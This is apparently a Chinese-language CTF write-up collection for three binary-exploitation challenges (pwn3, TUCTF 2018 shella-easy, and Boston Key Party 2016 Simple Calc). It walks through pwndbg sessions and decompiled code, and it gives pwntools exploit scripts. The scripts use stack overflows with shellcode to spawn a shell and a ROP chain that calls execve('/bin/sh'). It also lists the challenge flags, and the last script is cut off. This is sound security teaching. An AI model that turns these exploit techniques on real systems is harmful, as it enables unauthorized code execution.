aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
pwndbg> c
Continuing.
Take this, you might need it on your journey 0xffffd49e!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac

Program received signal SIGSEGV, Segmentation fault.
0x56555622 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
*EAX  0x0
*EBX  0x61796361 ('acya')
*ECX  0xf7f948ac ◂— 0x0
*EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x56555630 (__libc_csu_init) ◂— push ebp
*EBP  0xff006361
*ESP  0xff006359
*EIP  0x56555622 (main+63) ◂— pop ecx
────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────────────────────────────────────────────────
 ► 0x56555622 <main+63>                    pop    ecx
   0x56555623 <main+64>                    pop    ebx
   0x56555624 <main+65>                    pop    ebp
   0x56555625 <main+66>                    lea    esp, [ecx - 4]
   0x56555628 <main+69>                    ret

   0x56555629 <__x86.get_pc_thunk.ax>      mov    eax, dword ptr [esp]
   0x5655562c <__x86.get_pc_thunk.ax+3>    ret

   0x5655562d <__x86.get_pc_thunk.ax+4>    nop
   0x5655562f <__x86.get_pc_thunk.ax+6>    nop
   0x56555630 <__libc_csu_init>            push   ebp
   0x56555631 <__libc_csu_init+1>          push   edi
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
<Could not read memory at 0xff006359>
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0 0x56555622 main+63
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l acya
Finding cyclic pattern of 4 bytes: b'acya' (hex: 0x61637961)
Found at offset 294
```

这里发现一个新的计算偏移量方法：

```plaintext
pwndbg> b *echo+56
Breakpoint 1 at 0x5d5
pwndbg> b *echo+61
Breakpoint 2 at 0x5da
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/pwn3
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
Take this, you might need it on your journey 0xffffd49e!

Breakpoint 1, 0x565555d5 in echo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0xffffd49e ◂— 0x80000
*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x56555630 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
*ESP  0xffffd480 —▸ 0xffffd49e ◂— 0x80000
*EIP  0x565555d5 (echo+56) —▸ 0xfffe46e8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x565555d5 <echo+56>    call   56555420h                     <gets@plt>
        arg[0]: 0xffffd49e ◂— 0x80000
        arg[1]: 0xffffd49e ◂— 0x80000
        arg[2]: 0xffffffff
        arg[3]: 0x565555ac (echo+15) ◂— add ebx, 1a20h

   0x565555da <echo+61>    add    esp, 10h
   0x565555dd <echo+64>    nop
   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
   0x565555e1 <echo+68>    leave
   0x565555e2 <echo+69>    ret

   0x565555e3 <main>       lea    ecx, [esp + 4]
   0x565555e7 <main+4>     and    esp, 0fffffff0h
   0x565555ea <main+7>     push   dword ptr [ecx - 4]
   0x565555ed <main+10>    push   ebp
   0x565555ee <main+11>    mov    ebp, esp
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp   0xffffd480 —▸ 0xffffd49e ◂— 0x80000
01:0004│-144   0xffffd484 —▸ 0xffffd49e ◂— 0x80000
02:0008│-140   0xffffd488 ◂— 0xffffffff
03:000c│-13c   0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
04:0010│-138   0xffffd490 ◂— 0x100
05:0014│-134   0xffffd494 ◂— 0x0
06:0018│-130   0xffffd498 ◂— 0x40 /* '@' */
07:001c│ eax-2 0xffffd49c ◂— 0x8000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x565555d5 echo+56
   1 0x5655561a main+55
   2 0xf7d84bd7
   3 0xf7d84c9d __libc_start_main+141
   4 0x56555491 _start+49
──────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
1234567

Breakpoint 2, 0x565555da in echo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
 EAX  0xffffd49e ◂— '1234567'
 EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
*ECX  0xf7f948ac ◂— 0x0
 EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x56555630 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
 ESP  0xffffd480 —▸ 0xffffd49e ◂— '1234567'
*EIP  0x565555da (echo+61) ◂— add esp, 10h
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
   0x565555d5 <echo+56>    call   56555420h                     <gets@plt>

 ► 0x565555da <echo+61>    add    esp, 10h
   0x565555dd <echo+64>    nop
   0x565555de <echo+65>    mov    ebx, dword ptr [ebp - 4]
   0x565555e1 <echo+68>    leave
   0x565555e2 <echo+69>    ret
    ↓
   0x5655561a <main+55>    mov    eax, 0
   0x5655561f <main+60>    lea    esp, [ebp - 8]
   0x56555622 <main+63>    pop    ecx
   0x56555623 <main+64>    pop    ebx
   0x56555624 <main+65>    pop    ebp
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp   0xffffd480 —▸ 0xffffd49e ◂— '1234567'
01:0004│-144   0xffffd484 —▸ 0xffffd49e ◂— '1234567'
02:0008│-140   0xffffd488 ◂— 0xffffffff
03:000c│-13c   0xffffd48c —▸ 0x565555ac (echo+15) ◂— add ebx, 1a20h
04:0010│-138   0xffffd490 ◂— 0x100
05:0014│-134   0xffffd494 ◂— 0x0
06:0018│-130   0xffffd498 ◂— 0x40 /* '@' */
07:001c│ eax-2 0xffffd49c ◂— 0x32318000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x565555da echo+61
   1 0x5655561a main+55
   2 0xf7d84bd7
   3 0xf7d84c9d __libc_start_main+141
   4 0x56555491 _start+49
──────────────────────────────────────────────────────────────────────────────────
pwndbg> search 1234567
Searching for value: '1234567'
[heap]          0x565581a0 '1234567\n'
libc.so.6       0xf7f17011 0x34333231 ('1234')
libc.so.6       0xf7f2585e '123456789:;<=>?'
libc.so.6       0xf7f349e3 '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
libc.so.6       0xf7f34a41 '123456789abcdefghijklmnopqrstuvwxyz'
libc.so.6       0xf7f34a81 '123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
libc.so.6       0xf7f34af5 '123456789'
libc.so.6       0xf7f38af1 '123456789abcdef'
ld-linux.so.2   0xf7ff1ebd '123456789abcdef'
[stack]         0xffffd49e '1234567'
pwndbg> i frame
Stack level 0, frame at 0xffffd5d0:
 eip = 0x565555da in echo; saved eip = 0x5655561a
 called by frame at 0xffffd5f0
 Arglist at 0xffffd5c8, args:
 Locals at 0xffffd5c8, Previous frame's sp is 0xffffd5d0
 Saved registers:
  ebx at 0xffffd5c4, ebp at 0xffffd5c8, eip at 0xffffd5cc
pwndbg> hex(0xffffd5cc-0xffffd49e)
+0000 0x00012e
```

最终偏移量是 `0x12e` 而不是 `0x126` 的原因是中间还隔着两个四字节寄存器 `ebx` 和 `ebp`。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='i386', log_level='debug', terminal='kitty')

target = process('./pwn3')

recvline    = lambda : target.recvline()
recvuntil   = lambda str : target.recvuntil(str)
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b'journey ')

leak_addr = p32(int(recvuntil(b'!').strip(b'!\n'), 16))

shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (0x12e - len(shellcode)) + leak_addr

sendline(payload)
interactive()
```

## Flag

Flag: `gigem{r3m073_fl46_3x3cu710n}`

# TUCTF 2018 shella-easy

## Information

- Category: Pwn
- Points: 345

## Description

> Want to be a drive-thru attendant? Well, no one does… But! the best employee receives their very own flag! whatdya say?

## Write-up

```plaintext
λ ~/ file shella-easy
shella-easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=38de2077277362023aadd2209673b21577463b66, not stripped
λ ~/ pwn checksec shella-easy
[*] '/home/cub3y0nd/shella-easy'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments
```

```plaintext
λ ~/ ./shella-easy
Yeah I'll have a 0xffe6f1b0 with a side of fries thanks
no way
```

伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[64]; // [esp+0h] [ebp-48h] BYREF
  int v5; // [esp+40h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0x14u);
  setvbuf(stdin, 0, 2, 0x14u);
  v5 = 0xCAFEBABE;
  printf("Yeah I'll have a %p with a side of fries thanks\n", s);
  gets(s);
  if ( v5 != 0xDEADBEEF )
    exit(0);
  return 0;
}
```

一眼出：溢出 `s`，覆盖返回地址到 `s` 中保存的 shellcode，并且覆盖 `v5` 为 `0xDEADBEEF` 以让程序正常返回。

溢出 `s` 并覆盖 `v5` 很简单，我们看看怎么覆盖返回地址：

```plaintext
Breakpoint 1 at 0x804855a
Breakpoint 2 at 0x8048541

Breakpoint 2, 0x08048541 in main ()
------- tip of the day (disable with set show-tips off) -------
Use GDB's pi command to run an interactive Python console where you can use Pwndbg APIs like pwndbg.gdblib.memory.read(addr, len), pwndbg.gdblib.memory.write(addr, data), pwndbg.gdb.vmmap.get() and so on!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0xff8d7200 ◂— 0x2f68686a ('jhh/')
*EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1
*ECX  0xf67138ac ◂— 0x0
*EDX  0x0
*EDI  0xf677bb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048560 (__libc_csu_init) ◂— push ebp
*EBP  0xff8d7248 ◂— 0x0
*ESP  0xff8d7200 ◂— 0x2f68686a ('jhh/')
*EIP  0x8048541 (main+102) ◂— cmp dword ptr [ebp - 8], 0deadbeefh
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x8048541  <main+102>    cmp    dword ptr [ebp - 8], 0deadbeefh
   0x8048548  <main+109>    je     8048551h                      <main+118>
    ↓
   0x8048551  <main+118>    mov    eax, 0
   0x8048556  <main+123>    mov    ebx, dword ptr [ebp - 4]
   0x8048559  <main+126>    leave
   0x804855a  <main+127>    ret
    ↓
   0xf6503bd7               add    esp, 10h
   0xf6503bda               sub    esp, 0ch
   0xf6503bdd               push   eax
   0xf6503bde               call   0f651e590h                    <exit>

   0xf6503be3               call   0f6570d20h                    <0xf6570d20>
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ eax esp 0xff8d7200 ◂— 0x2f68686a ('jhh/')
01:0004│-044     0xff8d7204 ◂— 0x68732f2f ('//sh')
02:0008│-040     0xff8d7208 ◂— 0x6e69622f ('/bin')
03:000c│-03c     0xff8d720c ◂— 0x168e389
04:0010│-038     0xff8d7210 ◂— 0x81010101
05:0014│-034     0xff8d7214 ◂— 0x69722434 ('4$ri')
06:0018│-030     0xff8d7218 ◂— 0xc9310101
07:001c│-02c     0xff8d721c ◂— 0x59046a51
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x8048541 main+102
   1 0xf6503bd7
   2 0xf6503c9d __libc_start_main+141
   3 0x8048401 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 20
00:0000│ eax esp 0xff8d7200 ◂— 0x2f68686a ('jhh/')
01:0004│-044     0xff8d7204 ◂— 0x68732f2f ('//sh')
02:0008│-040     0xff8d7208 ◂— 0x6e69622f ('/bin')
03:000c│-03c     0xff8d720c ◂— 0x168e389
04:0010│-038     0xff8d7210 ◂— 0x81010101
05:0014│-034     0xff8d7214 ◂— 0x69722434 ('4$ri')
06:0018│-030     0xff8d7218 ◂— 0xc9310101
07:001c│-02c     0xff8d721c ◂— 0x59046a51
08:0020│-028     0xff8d7220 ◂— 0x8951e101
09:0024│-024     0xff8d7224 ◂— 0x6ad231e1
0a:0028│-020     0xff8d7228 ◂— 0x80cd580b
0b:002c│-01c     0xff8d722c ◂— 0x41414141 ('AAAA')
... ↓            4 skipped
10:0040│-008     0xff8d7240 ◂— 0xdeadbeef
11:0044│-004     0xff8d7244 —▸ 0xff8d7200 ◂— 0x2f68686a ('jhh/')
12:0048│ ebp     0xff8d7248 ◂— 0x0
13:004c│+004     0xff8d724c —▸ 0xf6503bd7 ◂— add esp, 10h
pwndbg> c
Continuing.

Breakpoint 1, 0x0804855a in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0x0
*EBX  0xff8d7200 ◂— 0x2f68686a ('jhh/')
 ECX  0xf67138ac ◂— 0x0
 EDX  0x0
 EDI  0xf677bb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x8048560 (__libc_csu_init) ◂— push ebp
*EBP  0x0
*ESP  0xff8d724c —▸ 0xf6503bd7 ◂— add esp, 10h
*EIP  0x804855a (main+127) ◂— ret
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
   0x8048551  <main+118>    mov    eax, 0
   0x8048556  <main+123>    mov    ebx, dword ptr [ebp - 4]
   0x8048559  <main+126>    leave
 ► 0x804855a  <main+127>    ret    <0xf6503bd7>
    ↓
   0xf6503bd7               add    esp, 10h
   0xf6503bda               sub    esp, 0ch
   0xf6503bdd               push   eax
   0xf6503bde               call   0f651e590h                    <exit>

   0xf6503be3               call   0f6570d20h                    <0xf6570d20>

   0xf6503be8               mov    eax, dword ptr [esp]
   0xf6503beb               lock sub dword ptr [eax + 290h], 1
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xff8d724c —▸ 0xf6503bd7 ◂— add esp, 10h
01:0004│     0xff8d7250 ◂— 0x1
02:0008│     0xff8d7254 —▸ 0xff8d7304 —▸ 0xff8d87c6 ◂— './shella-easy'
03:000c│     0xff8d7258 —▸ 0xff8d730c —▸ 0xff8d87d4 ◂— 'MOTD_SHOWN=pam'
04:0010│     0xff8d725c —▸ 0xff8d7270 —▸ 0xf6711e2c ◂— 0x22ed4c
05:0014│     0xff8d7260 —▸ 0xf6711e2c ◂— 0x22ed4c
06:0018│     0xff8d7264 —▸ 0x80484db (main) ◂— push ebp
07:001c│     0xff8d7268 ◂— 0x1
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x804855a main+127
   1 0xf6503bd7
   2 0xf6503c9d __libc_start_main+141
   3 0x8048401 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> i frame
Stack level 0, frame at 0xff8d7250:
 eip = 0x804855a in main; saved eip = 0xf6503bd7
 called by frame at 0xff8d72b0
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xff8d7250
 Saved registers:
  eip at 0xff8d724c
pwndbg> hex(0xff8d724c-0xff8d7240)
+0000 0x00000c
```

由此可知，`0xc` 是我们 `ret` 和 `0xdeadbeef` 之间的距离，因为是 i386，所以我们减四就是偏移量了。

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='i386', log_level='debug', terminal='kitty')

target = process('./shella-easy')

recvline    = lambda : target.recvline()
recvuntil   = lambda str : target.recvuntil(str)
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b'a ')

leak_addr = p32(int(recvuntil(b' ').strip(b' '), 16))

shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (64 - len(shellcode)) + p32(0xdeadbeef) + b'B' * 0x8 + leak_addr

sendline(payload)
interactive()
```

## Flag

Flag: `TUCTF{1_607_4_fl46_bu7_n0_fr135}`

# Boston Key Part 2016 Simple Calc

## Information

- Category: Pwn
- Points: 5

## Description

> what a nice little calculator!

## Write-up

```plaintext
λ ~/ file simplecalc
simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
λ ~/ pwn checksec simplecalc
[*] '/home/cub3y0nd/simplecalc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plaintext
λ ~/ ./simplecalc

 |#------------------------------------#|
 |         Something Calculator         |
 |#------------------------------------#|

Expected number of calculations: 100
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 1
Integer x: 200
Integer y: 200
Result for x + y is 400.

Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5
zsh: segmentation fault (core dumped)  ./simplecalc
```

伪代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int *v7; // rsi
  int v8; // edx
  int v9; // ecx
  int v10; // r8d
  int v11; // r9d
  const char *v13; // rdi
  _DWORD *v14; // rdx
  int v15; // ecx
  int v16; // r8d
  int v17; // r9d
  int v18; // edx
  int v19; // ecx
  int v20; // r8d
  int v21; // r9d
  int v22; // edx
  int v23; // ecx
  int v24; // r8d
  int v25; // r9d
  char v26[40]; // [rsp+10h] [rbp-40h] BYREF
  int v27; // [rsp+38h] [rbp-18h] BYREF
  int v28; // [rsp+3Ch] [rbp-14h] BYREF
  __int64 v29; // [rsp+40h] [rbp-10h]
  int i; // [rsp+4Ch] [rbp-4h]

  v28 = 0;
  setvbuf(stdin, 0LL, 2LL, 0LL);
  setvbuf(stdout, 0LL, 2LL, 0LL);
  print_motd();
  printf((unsigned int)"Expected number of calculations: ", 0, v3, v4, v5, v6);
  v7 = &v28;
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&v28, v8, v9, v10, v11);
  handle_newline();
  if ( v28 <= 255 && v28 > 3 )
  {
    v13 = (const char *)(4 * v28);
    v29 = malloc(v13);
    for ( i = 0; i < v28; ++i )
    {
      print_menu((__int64)v13, (int)v7, (int)v14, v15, v16, v17);
      v7 = &v27;
      v13 = "%d";
      _isoc99_scanf((unsigned int)"%d", (unsigned int)&v27, v18, v19, v20, v21);
      handle_newline();
      switch ( v27 )
      {
        case 1:
          adds((__int64)"%d", (int)&v27, v22, v23, v24, v25);
          v14 = (_DWORD *)(v29 + 4LL * i);
          *v14 = dword_6C4A88;
          break;
        case 2:
          subs((__int64)"%d", (int)&v27, v22, v23, v24, v25);
          v14 = (_DWORD *)(v29 + 4LL * i);
          *v14 = dword_6C4AB8;
          break;
        case 3:
          muls((__int64)"%d", (int)&v27, v22, v23, v24, v25);
          v14 = (_DWORD *)(v29 + 4LL * i);
          *v14 = dword_6C4AA8;
          break;
        case 4:
          divs((__int64)"%d", (int)&v27, v22, v23, v24, v25);
          v14 = (_DWORD *)(v29 + 4LL * i);
          *v14 = dword_6C4A98;
          break;
        case 5:
          memcpy(v26, v29, 4 * v28);
          free(v29);
          return 0;
        default:
          v13 = "Invalid option.\n";
          puts("Invalid option.\n");
          break;
      }
    }
    free(v29);
    return 0;
  }
  else
  {
    puts("Invalid number.");
    return 0;
  }
}
```

它先问我们要一个预期计算次数，保存在 `v28` 中，若 `v28` 大于 3 且小于等于 255 则继续执行下面的控制流。接下来给 `v29` 分配了 `4 * v28` 的大小，然后进入计算器界面，根据 `v27` 拿到的输入选项执行不同的计算函数。比如 `adds` 的伪代码：

```c
__int64 __fastcall adds(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v6; // edx
  int v7; // ecx
  int v8; // r8d
  int v9; // r9d
  int v10; // edx
  int v11; // ecx
  int v12; // r8d
  int v13; // r9d
  int v14; // edx
  int v15; // ecx
  int v16; // r8d
  int v17; // r9d
  int v18; // ecx
  int v19; // r8d
  int v20; // r9d

  printf((unsigned int)"Integer x: ", a2, a3, a4, a5, a6);
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&add, v6, v7, v8, v9);
  handle_newline();
  printf((unsigned int)"Integer y: ", (unsigned int)&add, v10, v11, v12, v13);
  _isoc99_scanf((unsigned int)"%d", (unsigned int)&dword_6C4A84, v14, v15, v16, v17);
  handle_newline();
  if ( (unsigned int)add <= 0x27 || (unsigned int)dword_6C4A84 <= 0x27 )
  {
    puts("Do you really need help calculating such small numbers?\nShame on you... Bye");
    exit(0xFFFFFFFFLL);
  }
  dword_6C4A88 = add + dword_6C4A84;
  return printf((unsigned int)"Result for x + y is %d.\n\n", add + dword_6C4A84, add, v18, v19, v20);
}
```

这个函数从输入流获取两个参数 `x` 和 `y`，分别保存在 `&add` 和 `&dword_6C4A84` 处。然后判断这两个参数中任意一个是否小于等于 0x27(39D)，如果满足则退出，否则将结果保存在 `dword_6C4A88`，并输出结果。最后程序将在 `v29` 中开辟一小块空间将我们的计算结果放进去。

剩下几个计算函数的伪代码形式都差不多，就不展示了。

这里重点在选项 5 存在溢出问题。执行选项 5，程序用 `memcpy` 将从 `v29` 开始的 `4 * v28` 大小内容复制到 `v26`。但是看 `v26` 的定义可知，它只有 40 Bytes 的容量。这使我们有足够的空间为所欲为 xD

所以我们的思路大致是这样：构造一个执行 `/bin/sh` 的 ROP Chain。由于程序最后会把我们的所有计算结果复制到栈上，所以构造方法是通过程序的计算功能算出各个 gadget 的地址。

需要注意的是 `memcpy` 之后有一个 `free` 会清除我们的栈，为了绕过，我们可以给 `free` 赋 0。

so，先来看看溢出点：

```plaintext
pwndbg> b *main+450
Breakpoint 1 at 0x401545
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/simplecalc

 |#------------------------------------#|
 |         Something Calculator         |
 |#------------------------------------#|

Expected number of calculations: 100
Options Menu:
 [1] Addition.
 [2] Subtraction.
 [3] Multiplication.
 [4] Division.
 [5] Save and Exit.
=> 5

Breakpoint 1, 0x0000000000401545 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*RAX  0x7fffffffe3c0 ◂— 0x1
*RBX  0x4002b0 (_init) ◂— sub rsp, 8
*RCX  0x6c8bd0 ◂— 0x0
*RDX  0x190
*RDI  0x7fffffffe3c0 ◂— 0x1
*RSI  0x6c8bd0 ◂— 0x0
*R8   0x6c6880 ◂— 0x6c6880
 R9   0x0
*R10  0x5
 R11  0x0
 R12  0x0
*R13  0x401c00 (__libc_csu_init) ◂— push r14
*R14  0x401c90 (__libc_csu_fini) ◂— push rbx
 R15  0x0
*RBP  0x7fffffffe400 —▸ 0x6c1018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x42f230 (__stpcpy_ssse3) ◂— mov rcx, rsi
*RSP  0x7fffffffe3b0 —▸ 0x7fffffffe4e8 —▸ 0x7fffffffe861 ◂— '/home/cub3y0nd/Projects/CTF/simplecalc'
*RIP  0x401545 (main+450) ◂— call 4228d0h
───────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────
 ► 0x401545 <main+450>    call   4228d0h                       <memcpy>
        dest: 0x7fffffffe3c0 ◂— 0x1
        src: 0x6c8bd0 ◂— 0x0
        n: 0x190

   0x40154a <main+455>    mov    rax, qword ptr [rbp - 10h]
   0x40154e <main+459>    mov    rdi, rax
   0x401551 <main+462>    call   4156d0h                       <free>

   0x401556 <main+467>    mov    eax, 0
   0x40155b <main+472>    jmp    401588h                       <main+517>

   0x40155d <main+474>    mov    edi, 494402h
   0x401562 <main+479>    call   408de0h                       <puts>

   0x401567 <main+484>    add    dword ptr [rbp - 4], 1
   0x40156b <main+488>    mov    eax, dword ptr [rbp - 14h]
   0x40156e <main+491>    cmp    dword ptr [rbp - 4], eax
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ rsp     0x7fffffffe3b0 —▸ 0x7fffffffe4e8 —▸ 0x7fffffffe861 ◂— '/home/cub3y0nd/Projects/CTF/simplecalc'
01:0008│-048     0x7fffffffe3b8 ◂— 0x100400e45
02:0010│ rax rdi 0x7fffffffe3c0 ◂— 0x1
03:0018│-038     0x7fffffffe3c8 ◂— 0x1
04:0020│-030     0x7fffffffe3d0 —▸ 0x7fffffffe4e8 —▸ 0x7fffffffe861 ◂— '/home/cub3y0nd/Projects/CTF/simplecalc'
05:0028│-028     0x7fffffffe3d8 —▸ 0x401c77 (__libc_csu_init+119) ◂— add rbx, 1
06:0030│-020     0x7fffffffe3e0 —▸ 0x4002b0 (_init) ◂— sub rsp, 8
07:0038│-018     0x7fffffffe3e8 ◂— 0x6400000005
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0         0x401545 main+450
   1         0x40176c __libc_start_main+476
   2         0x400f77 _start+41
──────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0x7fffffffe410:
 rip = 0x401545 in main; saved rip = 0x40176c
 called by frame at 0x7fffffffe4d0
 Arglist at 0x7fffffffe400, args:
 Locals at 0x7fffffffe400, Previous frame's sp is 0x7fffffffe410
 Saved registers:
  rbp at 0x7fffffffe400, rip at 0x7fffffffe408
pwndbg> distance 0x7fffffffe3c0 0x7fffffffe408
0x7fffffffe3c0->0x7fffffffe408 is 0x48 bytes (0x9 words)
```

可以看到目标地址距离 rip 是 `0x48(72D)` Bytes，也就是 18 个 `int`。为了不让程序执行到 `free` 的时候崩溃，我们可以使前 18 个计算结果为 `0`。

接下来就是如何构造 ROP Chain 了。我们的目标是执行 `/bin/sh`，所以可以通过调用 `execve()` 来实现。

查 [syscall table](https://filippo.io/linux-syscall-table/) 可知要让 `syscall` 执行 `execve()` 需要把 `rax` 设为 59(0x3b)。此外，根据 `execve` 的定义知道它还有三个参数需要满足：`int execve(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]);` 第一个参数是 `pathname`，这里我们需要放 `/bin/sh` 的地址，剩下两个参数我们用不上，直接置 0 即可。

那么根据调用约定，`execve` 的三个参数依次分别存放在 `rdi`、`rsi`、`rdx` 中。

所以我们的 ROP Chain 应该长这样：

```plaintext
pop rdi ; ret
/bin/sh\0
pop rsi ; ret
0
pop rdx ; ret
0
pop rax ; ret
0x3b
syscall
```

但实际上这样会出问题，问题就是不能通过 `pop` 把 `/bin/sh` 字符串传入，这样传会被认为是指令而不是数据。所以我们需要通过 `mov` 指令来实现传入 `/bin/sh`：

```plaintext
mov rdi, rsp
/bin/sh\0
pop rsi ; ret
0
pop rdx ; ret
0
pop rax ; ret
0x3b
syscall
```

通过 `ROPgadget` 我们可以找到这些 gadget 的地址：

```plaintext
0x0000000000400493 : pop r12 ; ret
0x0000000000492468 : mov rdi, rsp ; call r12
0x0000000000437aa9 : pop rdx ; pop rsi ; ret
0x000000000044db34 : pop rax ; ret
0x0000000000400488 : syscall
```

## Exploit

```python
#!/usr/bin/python3

from pwn import *

context(
    os='linux',
    arch='amd64',
    log_level='debug',
    terminal='kitty',
    binary=ELF('./simplecalc')
)

target = process()

recvline      = lambda : target.recvline()
recvuntil     = lambda str : target.recvuntil(str)
sendline      = lambda str : target.sendline(str)
sendlineafter = lambda str1, str2 : target.sendlineafter(str1.encode(), str2.encode())
interactive   = lambda : target.interactive()

def add(x, y):
    sendlineafter('=> ', '1')
    sendlineafter('x: ', str(x))
    sendlineafter('y: ', str(y))

def sub(x, y):
    sendlineafter('=> ', '2')
    sendlineafter('x: ', str(x))
    sendlineafter('y: ', str(y))

sendlineafter('Expected number of calculations: ', '100')

# padding for free(0)
for i in range(0, 18):
    sub(40, 40)

# pop rdx ; pop rsi ; ret
add(4422000, 313)
sub(40, 40)
sub(40, 40)
sub(40, 40)
sub(40, 40)
sub(40, 40)
# pop r12 ; ret
add(4195000, 475)
sub(40, 40)
# syscall
add(4195000, 464)
sub(40, 40)
# pop rax ; ret
add(4512000, 564)
sub(40, 40)
# 0x3b
sub(100, 41)
sub(40, 40)
